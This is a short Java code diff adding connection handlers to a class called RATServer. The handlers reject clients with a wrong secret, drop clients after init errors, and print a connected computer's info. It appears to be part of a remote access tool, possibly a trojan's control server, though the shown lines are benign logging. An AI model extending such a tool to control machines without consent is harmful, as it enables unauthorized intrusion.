@@ -34,4 +34,19 @@ public class RATServer extends AbstractSocketServer {
     public void clientDisconnected(RATConnectedClient ratConnectedClient) {
         System.out.println("[server] client disconnected");
     }
+
+    public void incorrectSecret(RATConnectedClient ratConnectedClient) {
+        System.out.println("Client tried to connect with incorrect secret, disconnecting the client...");
+        ratConnectedClient.disconnected();
+    }
+
+    public void unknownInitError(RATConnectedClient ratConnectedClient) {
+        System.out.println("Unknown error occurred while performing init, disconnecting the client...");
+        ratConnectedClient.disconnected();
+    }
+
+    public void successInit(RATConnectedClient ratConnectedClient) {
+        System.out.println("Client connected, computer info:");
+        System.out.println(ratConnectedClient.getFormattedComputerInfo());
+    }
 }
